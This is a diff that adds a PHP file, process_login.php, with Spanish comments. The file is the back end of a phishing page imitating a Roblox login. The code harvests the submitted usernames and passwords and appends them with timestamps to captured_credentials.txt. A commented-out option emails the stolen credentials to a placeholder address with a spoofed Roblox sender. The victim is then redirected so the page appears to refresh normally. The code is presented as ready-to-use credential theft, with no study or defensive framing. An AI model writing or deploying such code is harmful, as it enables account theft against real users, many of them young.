@@ -1,0 +1,55 @@
+<?php
+// process_login.php
+
+// 1. Verificar que la solicitud fue POST (que vino de un envío de formulario)
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    
+    // 2. Capturar y limpiar los datos enviados desde el HTML
+    $username = htmlspecialchars($_POST['username']); // Nombre de usuario/Email
+    $password = htmlspecialchars($_POST['password']); // Contraseña
+
+    // 3. *** LÓGICA DE CAPTURA DEL PHISHING ***
+    
+    // --- OPCIÓN A: Guardar en un archivo de texto (La más fácil) ---
+    $log_file = 'captured_credentials.txt';
+    $timestamp = date("Y-m-d H:i:s");
+    $log_entry = "[$timestamp] Usuario: $username | Contraseña: $password\n";
+
+    // Añadir la nueva entrada al final del archivo (FILE_APPEND)
+    if (file_put_contents($log_file, $log_entry, FILE_APPEND) !== false) {
+        $capture_success = true;
+    } else {
+        $capture_success = false; // Falló al escribir en el archivo
+    }
+
+    // --- OPCIÓN B: Enviar por correo electrónico (Más profesional) ---
+    // Descomenta las líneas de abajo si quieres que te llegue un email automáticamente.
+    /*
+    $to = "TU_CORREO_DE_DESTINO@ejemplo.com"; // <-- ¡CAMBIA ESTO!
+    $subject = "🚨 Nuevo Intento de Login en Roblox Phishing 🚨";
+    $message = "Se capturaron credenciales:\nUsuario: $username\nContraseña: $password\n";
+    $headers = 'From: phishing@roblox.com';
+
+    if (mail($to, $subject, $message, $headers)) {
+        $capture_success = true; // Asumimos éxito si el mail se envió correctamente
+    } else {
+        $capture_success = false; // Falló al enviar el correo
+    }
+    */
+
+
+    // 4. Redirigir al usuario (Esto hace que la página "se actualice" con un mensaje de éxito)
+    if ($capture_success) {
+        header("Location: index.html?status=success"); // Éxito, ¡el dato fue guardado!
+    } else {
+        // Si falló el guardado/envío, le decimos que hubo un error en la captura
+        header("Location: index.html?status=error"); 
+    }
+    exit();
+
+} else {
+    // Si alguien accede a process_login.php directamente sin pasar por el formulario
+    header("Location: index.html?status=error");
+    exit();
+}
+?>
